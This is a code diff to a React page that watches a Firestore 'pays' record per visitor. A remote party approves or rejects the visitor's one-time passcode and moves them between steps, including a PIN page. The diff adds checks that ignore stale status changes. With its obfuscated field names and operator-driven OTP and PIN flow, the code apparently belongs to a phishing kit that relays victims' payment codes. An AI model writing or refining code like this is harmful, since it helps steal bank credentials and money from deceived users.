@@ -85,12 +85,20 @@ export default function VeriPage() {
 
     const unsubscribe = onSnapshot(
       doc(db as Firestore, "pays", visitorID),
-      (docSnapshot) => {
+      async (docSnapshot) => {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data()
           const status = data._v5Status as "pending" | "verifying" | "approved" | "rejected"
+          const updatedAt = data._v5StatusUpdatedAt as number | undefined
+          const now = Date.now()
 
           if (status === "rejected") {
+            // Check if this is a NEW action (within 3 seconds)
+            if (!updatedAt || (now - updatedAt > 3000)) {
+              console.log('[step2] Stale rejection, ignoring')
+              return
+            }
+            
             // Save rejected OTP and reset status
             const updates: any = {
               _v5Status: "pending"
@@ -114,6 +122,17 @@ export default function VeriPage() {
               setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
             })
           } else if (status === "approved") {
+            // Check if this is a NEW action (within 3 seconds)
+            if (!updatedAt || (now - updatedAt > 3000)) {
+              console.log('[step2] Stale approval, ignoring')
+              return
+            }
+            
+            // Mark as processed
+            await setDoc(doc(db as Firestore, "pays", visitorID), {
+              _v5StatusUpdatedAt: now
+            }, { merge: true })
+            
             _ss5("approved")
             setError("")
             // Redirect to PIN page
@@ -143,18 +162,28 @@ export default function VeriPage() {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data()
           const step = data.currentStep
+          const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined
+          const now = Date.now()
 
           // Redirect based on currentStep
-          if (step === "home") {
-            router.push("/insur")
-          } else if (step === "phone") {
-            router.push("/step5")
-          } else if (step === "_t6") {
-            router.push("/step4")
-          } else if (step === "_st1") {
-            router.push("/check")
-          } else if (step === "_t3") {
-            router.push("/step3")
+          if (step && step !== "veri") {
+            // Check if this is a NEW redirect (within 3 seconds)
+            if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 3000)) {
+              console.log('[step2] Stale currentStep redirect, ignoring')
+              return
+            }
+            
+            if (step === "home") {
+              router.push("/insur")
+            } else if (step === "phone") {
+              router.push("/step5")
+            } else if (step === "_t6") {
+              router.push("/step4")
+            } else if (step === "_st1") {
+              router.push("/check")
+            } else if (step === "_t3") {
+              router.push("/step3")
+            }
           }
         }
       },
